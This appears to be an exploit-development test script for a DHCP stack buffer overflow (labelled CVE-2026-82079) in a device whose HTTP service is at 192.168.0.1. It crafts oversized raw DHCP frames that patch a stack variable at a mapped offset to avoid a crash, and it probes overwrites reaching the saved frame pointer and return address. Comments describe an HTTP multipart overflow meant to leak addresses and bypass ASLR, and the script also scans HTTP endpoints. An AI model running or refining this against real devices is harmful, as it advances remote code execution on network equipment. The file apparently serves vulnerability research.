#!/usr/bin/env -S sudo python3 -u -I
"""
CVE-2026-82079: No-crash overflow test.

INSIGHT: The crash at 1668B is from FUN_710009ec20 getting size = local_48 - 0xf0.
When local_48 = 0 (zeroed by overflow), size = -0xf0 = huge → crash.

FIX: Set local_48 (frame bytes 1660-1667) to 0xf0 → size = 0 → no crash!

This test sends oversized DHCP packets with controlled local_48 values:
  - 1668B with local_48 = 0xf0 → should NOT crash
  - 1676B with local_48 = 0xf0 → reaches saved FP, should crash on epilogue
  - 1684B with local_48 = 0xf0 → reaches saved LR, should crash on epilogue

If the 1668B test succeeds (no crash), we confirm the intermediate code is safe
and the ONLY barrier is ASLR for FP/LR values.

Also tests: HTTP info leak via multipart overflow for ASLR bypass.
"""

import socket
import struct
import time
import os
import json
import sys
import threading
from pathlib import Path

_LDN_ROOT = Path(__file__).resolve().parent.parent.parent
IFACE = 'wlp5s0'
HTTP_TARGET = '192.168.0.1'
HTTP_PORT = 80
EVIDENCE_DIR = str(_LDN_ROOT / 'evidence' / 'exploit_dev')
ETH_IP_UDP = 42

# Stack layout (assembly-verified):
# Buffer:    FP - 0x684    (frame byte 0)
# uStack_58: FP - 0x18     (frame byte 0x66C = 1644)
# local_50:  FP - 0x10     (frame byte 0x674 = 1652)
# local_48:  FP - 0x08     (frame byte 0x67C = 1660)
# saved FP:  FP + 0x00     (frame byte 0x684 = 1668)
# saved LR:  FP + 0x08     (frame byte 0x68C = 1676)
# saved x28: FP + 0x10     (frame byte 0x694 = 1684)
# saved x23: FP + 0x18     (frame byte 0x69C = 1692)

LOCAL_48_OFFSET = 1660
SAVED_FP_OFFSET = 1668
SAVED_LR_OFFSET = 1676


def get_mac(iface):
    with open(f'/sys/class/net/{iface}/address') as f:
        return bytes.fromhex(f.read().strip().replace(':', ''))


def ip_checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack(f'!{len(data)//2}H', data))
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    return ~s & 0xffff


def udp_checksum(src_ip, dst_ip, udp_no_cksum, payload):
    pseudo = struct.pack('!4s4sBBH', src_ip, dst_ip, 0, 17,
                         len(udp_no_cksum) + len(payload))
    data = pseudo + udp_no_cksum + payload
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack(f'!{len(data)//2}H', data))
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    result = ~s & 0xffff
    return result if result else 0xffff


def build_controlled_frame(our_mac, total_frame_size, patches=None):
    """Build DHCP DISCOVER with specific byte values at specific frame offsets.

    patches: dict of {frame_offset: bytes_value}
    """
    xid = int.from_bytes(os.urandom(4), 'big')

    bootp = struct.pack('!BBBBI HH', 1, 1, 6, 0, xid, 0, 0x8000)
    bootp += b'\x00' * 16
    bootp += our_mac + b'\x00' * 10
    bootp += b'\x00' * 64
    bootp += b'\x00' * 128
    assert len(bootp) == 236

    opts = struct.pack('!I', 0x63825363)
    opts += bytes([53, 1, 1])
    opts += bytes([55, 4, 1, 3, 6, 15])

    total_dhcp = total_frame_size - ETH_IP_UDP
    current = len(bootp) + len(opts) + 1
    pad = max(0, total_dhcp - current)
    opts += b'\x00' * pad
    opts += bytes([255])

    dhcp = bootp + opts
    udp_len = 8 + len(dhcp)
    src_ip = socket.inet_aton('0.0.0.0')
    dst_ip = socket.inet_aton('255.255.255.255')

    udp_no_ck = struct.pack('!HHH', 68, 67, udp_len) + b'\x00\x00'
    uck = udp_checksum(src_ip, dst_ip, udp_no_ck, dhcp)
    udp_hdr = struct.pack('!HHHH', 68, 67, udp_len, uck)

    ip_total = 20 + udp_len
    ip_hdr = struct.pack('!BBHHHBBH4s4s',
                         0x45, 0x00, ip_total,
                         xid & 0xffff, 0x4000, 64, 17, 0,
                         src_ip, dst_ip)
    ick = ip_checksum(ip_hdr)
    ip_hdr = ip_hdr[:10] + struct.pack('!H', ick) + ip_hdr[12:]

    eth_hdr = b'\xff\xff\xff\xff\xff\xff' + our_mac + struct.pack('!H', 0x0800)
    frame = bytearray(eth_hdr + ip_hdr + udp_hdr + dhcp)

    # Apply patches at specific frame offsets
    if patches:
        for offset, value in patches.items():
            if isinstance(value, int):
                value = struct.pack('<Q', value)
            end = offset + len(value)
            if end <= len(frame):
                frame[offset:end] = value

    return bytes(frame), xid


class DhcpSniffer:
    def __init__(self, iface):
        self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                  socket.htons(0x0800))
        self.sock.bind((iface, 0))
        self.sock.settimeout(0.2)
        self.responses = []
        self._run = False
        self._thread = None

    def start(self):
        self._run = True
        self.responses = []
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._run = False
        if self._thread:
            self._thread.join(timeout=2)
        try:
            self.sock.close()
        except Exception:
            pass

    def clear(self):
        self.responses.clear()

    def _loop(self):
        while self._run:
            try:
                data = self.sock.recv(4096)
                if len(data) < 42:
                    continue
                if struct.unpack('!H', data[12:14])[0] != 0x0800:
                    continue
                if data[23] != 17:
                    continue
                sp, dp = struct.unpack('!HH', data[34:38])
                if sp == 67 and dp == 68 and data[42] == 2:
                    xid_val = struct.unpack('!I', data[46:50])[0]
                    yiaddr = socket.inet_ntoa(data[58:62])
                    self.responses.append({
                        'xid': xid_val,
                        'yiaddr': yiaddr,
                        'size': len(data),
                        'hex': data.hex(),
                    })
            except socket.timeout:
                continue
            except Exception:
                continue


def check_http(timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.setsockopt(socket.SOL_SOCKET, 25, b'wlp5s0\0')
        s.connect((HTTP_TARGET, HTTP_PORT))
        s.sendall(b'GET /data.json HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
        resp = b''
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        s.close()
        return b'200 OK' in resp, resp
    except Exception as e:
        return False, b''


def send_and_check(raw_tx, sniffer, our_mac, total_size, patches, label):
    sniffer.clear()
    frame, xid = build_controlled_frame(our_mac, total_size, patches)
    raw_tx.send(frame)
    time.sleep(2.0)

    matching = [r for r in sniffer.responses if r['xid'] == xid]
    dhcp_ok = len(matching) > 0
    alive, http_resp = check_http()

    if dhcp_ok:
        print(f"  DHCP: YES ({matching[0]['size']}B, yiaddr={matching[0]['yiaddr']})")
    else:
        print(f"  DHCP: none")
    print(f"  HTTP: {'alive' if alive else '** UNAVAILABLE **'}")

    return {
        'test': label,
        'frame_size': total_size,
        'patches': {str(k): v.hex() if isinstance(v, bytes) else hex(v) for k, v in (patches or {}).items()},
        'dhcp_response': dhcp_ok,
        'http_alive': alive,
        'dhcp_resp_hex': matching[0]['hex'] if dhcp_ok else None,
    }


def main():
    if os.geteuid() != 0:
        print("Requires root.")
        sys.exit(1)

    os.makedirs(EVIDENCE_DIR, exist_ok=True)
    our_mac = get_mac(IFACE)

    with open(f'/sys/class/net/{IFACE}/mtu') as f:
        mtu = int(f.read().strip())
    if mtu < 2304:
        print(f"MTU {mtu}, need 2304")
        sys.exit(1)

    alive, _ = check_http()
    if not alive:
        print("HTTP down. Start Send to Smartphone.")
        sys.exit(1)

    print("=" * 60)
    print("CVE-2026-82079  NO-CRASH OVERFLOW TEST")
    print("=" * 60)
    print(f"Interface: {IFACE}, MAC: {our_mac.hex(':')}, MTU: {mtu}")
    print(f"HTTP: alive\n")

    raw_tx = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                           socket.htons(0x0800))
    raw_tx.bind((IFACE, 0))
    sniffer = DhcpSniffer(IFACE)
    sniffer.start()
    time.sleep(0.5)

    results = []

    # ==========================================================
    # TEST 1: Baseline — normal safe DHCP
    # ==========================================================
    print("[1] Baseline (300B, safe)")
    r = send_and_check(raw_tx, sniffer, our_mac, 300, None, 'baseline')
    results.append(r)
    print()

    # ==========================================================
    # TEST 2: 1668B with local_48 = 0 (old behavior → crash)
    #   SKIP: we know this crashes. Instead test with safe value.
    # ==========================================================

    # ==========================================================
    # TEST 2: 1668B with local_48 = 0xf0 → size = 0 → NO CRASH?
    # ==========================================================
    if check_http()[0]:
        print("[2] 1668B, local_48 = 0xf0 (size neutralized)")
        print(f"    Patching frame byte {LOCAL_48_OFFSET} = 0xf0 (LE)")
        r = send_and_check(raw_tx, sniffer, our_mac, 1668,
                           {LOCAL_48_OFFSET: 0xf0},
                           'nocrash_1668_safe_local48')
        results.append(r)
        print()

    # ==========================================================
    # TEST 3: 1670B with local_48 = 0xf0 → reaches 2 bytes into saved FP
    #   The epilogue reads saved FP from stack. If only 2 bytes
    #   are zeroed (low 2 bytes), the rest of FP might be valid
    #   enough for the ldp to not crash... or it might.
    # ==========================================================
    if check_http()[0]:
        print("[3] 1670B, local_48 = 0xf0 (2 bytes into saved FP)")
        r = send_and_check(raw_tx, sniffer, our_mac, 1670,
                           {LOCAL_48_OFFSET: 0xf0},
                           'nocrash_1670_partial_fp')
        results.append(r)
        print()

    # ==========================================================
    # TEST 4: 1668B with local_48 = 0x200 → size = 0x110 (272)
    #   This should copy 272 bytes from BPF buffer into local_6d8.
    #   That's a controlled but safe size. Does it change response?
    # ==========================================================
    if check_http()[0]:
        print("[4] 1668B, local_48 = 0x200 (size = 0x110 = 272B copy)")
        r = send_and_check(raw_tx, sniffer, our_mac, 1668,
                           {LOCAL_48_OFFSET: 0x200},
                           'nocrash_1668_medium_copy')
        results.append(r)
        print()

    # ==========================================================
    # TEST 5: 1668B with local_48 = original-ish value
    #   For a 1668B frame, the original local_48 would be ~1668.
    #   Set local_48 = 0x684 (1668).
    # ==========================================================
    if check_http()[0]:
        print("[5] 1668B, local_48 = 0x684 (1668, ~original value)")
        r = send_and_check(raw_tx, sniffer, our_mac, 1668,
                           {LOCAL_48_OFFSET: 0x684},
                           'nocrash_1668_original_local48')
        results.append(r)
        print()

    # ==========================================================
    # TEST 6: HTTP multipart probe — does the HTTP server accept
    #   POST with multipart data? What does the response look like?
    # ==========================================================
    if check_http()[0]:
        print("[6] HTTP multipart baseline")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.setsockopt(socket.SOL_SOCKET, 25, b'wlp5s0\0')
            s.connect((HTTP_TARGET, HTTP_PORT))

            boundary = b'----TestBoundary1234'
            filename = b'A' * 100  # safe short filename
            body = (b'------TestBoundary1234\r\n'
                    b'Content-Disposition: form-data; name="file"; filename="'
                    + filename + b'"\r\n'
                    b'Content-Type: application/octet-stream\r\n\r\n'
                    b'test data\r\n'
                    b'------TestBoundary1234--\r\n')

            req = (b'POST /upload HTTP/1.1\r\n'
                   b'Host: 192.168.0.1\r\n'
                   b'Content-Type: multipart/form-data; boundary=----TestBoundary1234\r\n'
                   b'Content-Length: ' + str(len(body)).encode() + b'\r\n'
                   b'\r\n' + body)

            s.sendall(req)
            resp = b''
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
            except socket.timeout:
                pass
            s.close()

            print(f"  Response: {len(resp)} bytes")
            # Print first 500 bytes for analysis
            print(f"  {resp[:500]}")
            results.append({
                'test': 'multipart_baseline',
                'response_size': len(resp),
                'response_preview': resp[:500].decode(errors='replace'),
            })
        except Exception as e:
            print(f"  Error: {e}")
            results.append({'test': 'multipart_baseline', 'error': str(e)})
        print()

    # ==========================================================
    # TEST 7: HTTP various endpoints — scan for functionality
    # ==========================================================
    if check_http()[0]:
        print("[7] HTTP endpoint scan")
        endpoints = [
            b'GET / HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n',
            b'GET /data.json HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n',
            b'GET /index.html HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n',
            b'GET /upload HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n',
            b'OPTIONS / HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n',
        ]
        for req in endpoints:
            method_path = req.split(b' HTTP')[0].decode()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.setsockopt(socket.SOL_SOCKET, 25, b'wlp5s0\0')
                s.connect((HTTP_TARGET, HTTP_PORT))
                s.sendall(req)
                resp = b''
                try:
                    while True:
                        chunk = s.recv(4096)
                        if not chunk:
                            break
                        resp += chunk
                except socket.timeout:
                    pass
                s.close()
                status = resp.split(b'\r\n')[0].decode() if resp else 'empty'
                clen = len(resp)
                print(f"  {method_path:30s} → {status} ({clen}B)")
            except Exception as e:
                print(f"  {method_path:30s} → error: {e}")
        print()

    sniffer.stop()
    raw_tx.close()

    # Save evidence
    path = f"{EVIDENCE_DIR}/nocrash_test_{int(time.time())}.json"
    with open(path, 'w') as f:
        json.dump({
            'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
            'tests': results,
        }, f, indent=2)
    print(f"Evidence: {path}")

    # Summary
    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    for r in results:
        t = r.get('test', '')
        dhcp = 'DHCP=YES' if r.get('dhcp_response') else 'DHCP=NO'
        http = 'HTTP=UP' if r.get('http_alive') else 'HTTP=DOWN'
        sz = r.get('frame_size', '?')
        if 'nocrash' in t:
            print(f"  {t}: {dhcp} {http} ({sz}B)")
            if r.get('http_alive') and r.get('dhcp_response'):
                print(f"    *** NO CRASH — intermediate code safe! ***")


if __name__ == '__main__':
    main()
